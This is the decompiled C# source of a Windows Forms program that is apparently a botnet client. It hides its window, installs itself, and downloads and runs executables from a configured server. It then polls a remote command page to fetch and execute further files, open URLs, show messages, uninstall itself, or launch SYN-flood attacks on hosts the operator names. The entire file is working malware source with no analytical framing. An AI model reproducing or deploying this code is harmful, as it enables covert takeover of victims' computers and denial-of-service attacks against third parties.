using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using WindowsApplication1.Ddos;

namespace WindowsApplication1;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	public static string doubleURL = "";

	public static string doubleMSG = "";

	public static string doubleVISIT = "";

	public static string doubleSYN = "";

	public static string doubleUP = "";

	public static string doublekill = "";

	private static HttpWebRequest ReadMysite = (HttpWebRequest)WebRequest.Create(Config.MyUrl);

	public static string CommandSource = "";

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(284, 264);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		((Control)this).Hide();
		((Control)this).set_Visible(false);
		Install.Drop();
		try
		{
			WebRequest webRequest = WebRequest.Create(Config.Mybackup);
			webRequest.GetResponse();
			if (File.Exists(Path.GetTempPath() + "upback.exe"))
			{
				File.Delete(Path.GetTempPath() + "upback.exe");
			}
			WebClient webClient = new WebClient();
			webClient.DownloadFile(Config.Mybackup, Path.GetTempPath() + "upback.exe");
			ProcessStartInfo startInfo = new ProcessStartInfo(Path.GetTempPath() + "upback.exe");
			Process.Start(startInfo);
			Environment.Exit(0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Timer val = new Timer();
		val.set_Interval(Config.MyInterval);
		val.add_Tick((EventHandler)delegate
		{
			ConnectAndRead();
		});
		val.Start();
	}

	public static void ConnectAndRead()
	{
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		ReadMysite.GetResponse();
		GetPageSource(Config.MyCommands);
		Random random = new Random();
		string text = Conversions.ToString(random.Next(100000)) + "update.exe";
		try
		{
			CommandSource = GetPageSource(Config.MyCommands);
			if (CommandSource.Contains("DOWNLOAD"))
			{
				Regex regex = new Regex("DOWNLOAD (?<fileURL>\\S+)");
				MatchCollection matchCollection = regex.Matches(CommandSource);
				string value = matchCollection[0].Groups["fileURL"].Value;
				if (Operators.CompareString(doubleURL, value, false) != 0)
				{
					doubleURL = value;
					WebClient webClient = new WebClient();
					webClient.DownloadFile(value, Path.GetTempPath() + text);
					ProcessStartInfo startInfo = new ProcessStartInfo(Path.GetTempPath() + text);
					Process.Start(startInfo);
				}
			}
			if (CommandSource.Contains("MSG"))
			{
				Regex regex2 = new Regex("MSG (?<message>\\S+)");
				MatchCollection matchCollection2 = regex2.Matches(CommandSource);
				string value2 = matchCollection2[0].Groups["message"].Value;
				if (Operators.CompareString(doubleMSG, value2, false) != 0)
				{
					doubleMSG = value2;
					Interaction.MsgBox((object)value2, (MsgBoxStyle)0, (object)null);
				}
			}
			if (CommandSource.Contains("UPDATE"))
			{
				Regex regex3 = new Regex("UPDATE (?<up>\\S+)");
				MatchCollection matchCollection3 = regex3.Matches(CommandSource);
				string value3 = matchCollection3[0].Groups["up"].Value;
				if (Operators.CompareString(doubleUP, value3, false) != 0)
				{
					doubleUP = value3;
					WebClient webClient2 = new WebClient();
					webClient2.DownloadFile(value3, Path.GetTempPath() + text);
					ProcessStartInfo startInfo2 = new ProcessStartInfo(Path.GetTempPath() + text);
					Process.Start(startInfo2);
					Environment.Exit(0);
				}
			}
			if (CommandSource.Contains("KILL"))
			{
				try
				{
					Uninstall.Byebye();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (CommandSource.Contains("VISIT"))
			{
				Regex regex4 = new Regex("VISIT (?<site>\\S+)");
				MatchCollection matchCollection4 = regex4.Matches(CommandSource);
				string value4 = matchCollection4[0].Groups["site"].Value;
				if (Operators.CompareString(doubleVISIT, value4, false) != 0)
				{
					doubleVISIT = value4;
					Process.Start(value4);
				}
			}
			if (!CommandSource.Contains("SYN"))
			{
				return;
			}
			Regex regex5 = new Regex("SYN (?<host>\\S+) (?<port>\\d+) (?<threads>\\d+) (?<sockets>\\d+)");
			MatchCollection matchCollection5 = regex5.Matches(CommandSource);
			int num = 0;
			while (num != matchCollection5.Count)
			{
				string value5 = matchCollection5[num].Groups["host"].Value;
				int port = Convert.ToInt32(matchCollection5[num].Groups["port"].Value);
				int threads = Convert.ToInt32(matchCollection5[num].Groups["threads"].Value);
				int superSynSockets = Convert.ToInt32(matchCollection5[num].Groups["sockets"].Value);
				if (Operators.CompareString(doubleSYN, value5, false) != 0)
				{
					doubleSYN = value5;
					if (Syn.IsEnabled)
					{
						Syn.StopSuperSyn();
					}
					Syn.Host = value5;
					Syn.Port = port;
					Syn.Threads = threads;
					Syn.SuperSynSockets = superSynSockets;
					Syn.StartSuperSyn();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static string GetPageSource(string url)
	{
		WebClient webClient = new WebClient();
		string result = webClient.DownloadString(url);
		webClient.Dispose();
		return result;
	}

	public static bool UrlIsValid(string Host)
	{
		bool flag = false;
		try
		{
			Dns.Resolve(Host);
			return true;
		}
		catch (SocketException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			flag = false;
			ProjectData.ClearProjectError();
			return flag;
		}
	}
}
